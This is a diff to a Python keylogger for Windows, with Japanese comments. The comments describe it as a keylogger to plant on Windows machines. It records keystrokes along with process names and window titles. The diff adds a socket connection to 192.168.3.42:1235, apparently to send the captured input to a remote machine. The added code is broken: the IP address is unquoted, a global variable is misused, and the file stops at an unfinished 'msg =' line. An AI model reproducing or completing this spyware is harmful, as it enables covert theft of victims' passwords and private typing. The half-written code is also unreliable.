@@ -1,8 +1,13 @@
+import socket
+import pickle
 from pynput import keyboard # 実行前に pip install pynput をする必要があるかもしれない
 from ctypes import *
 from ctypes.wintypes import *   # Windows でしか使うことができないライブラリのため、Windows 以外に仕掛けることができない
  
 proc_status = None
+PORT = 50000
+BUFFER_SIZE = 1024
+str = ""
 
 def get_name_by_pid(pid):   # PID からプロセス名を取得する関数
     PROCESS_ALL_ACCESS = 0x1f0fff
@@ -36,7 +41,8 @@ def on_press(key):  # キー操作を記録するメイン関数
         if proc_status == window_title:
             pass
         else:
-            print("pid:{0} [{1}] [{2}]".format(pid, pid_name, window_title))
+            str = "pid:{0} [{1}][{2}]".format(pid, pid_name, window_title)
+            print(str)
             proc_status = window_title
         print(key.char, end="")
     except AttributeError:
@@ -49,6 +55,24 @@ def on_release(key):    # キーロガーを終了する際に ESC を入寮す�
     if key == keyboard.Key.esc:
         return False
 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((192.168.3.42, 1235))
+
+full_msg = b''
+
+"""
+with 開始処理 as 変数:
+    処理
+用途：開始と終了がセットになった処理に使う
+内容：with を使って開始すると処理実行後に自動で終了してくれる
+"""
+"""
+from pynput import keyboard
+keyboard.Listener(on_press = on_press, on_release = on_release).join()
+"""
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:   # マルチスレッド処理を実行する関数
     listener.join()
+
+while True:
+    msg = 
 
